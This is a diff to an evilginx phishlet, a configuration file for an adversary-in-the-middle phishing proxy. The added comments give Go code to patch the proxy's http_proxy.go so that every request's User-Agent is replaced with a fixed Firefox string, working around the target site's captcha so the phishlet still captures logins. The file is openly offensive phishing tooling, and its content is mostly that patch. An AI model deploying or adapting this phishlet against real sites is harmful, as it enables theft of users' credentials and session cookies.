@@ -6,6 +6,21 @@
 # Login With Email Will Not Work Due To Catpcha Failures.
 # Respective Javascripts Has been Added in Order to trigger, Login With Mobile Number.
 
+# Modified http_proxy.go is supposed to be used with this phishlet to fix recent changes.
+# Replace the core/http_proxy.go with modified http_proxy.go file and recompile
+
+# -> To make this phishlet work, We need to modify the proxy code.
+# -> Add below code lines in http_proxy.go file in /core directory of evilginx repo.
+# -> In http_proxy.go file on line 271 , Just above comment " //fix referer".
+#
+#				// Replace Any User Agent With UserAgent (Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0)
+#				useragent := req.Header.Get("User-Agent")
+#				if useragent != "" {
+#					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0")
+#					log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0 ", ps.Index)
+#				}
+#
+
 author: '@AN0NUD4Y'
 min_ver: '2.3.0'
 proxy_hosts:
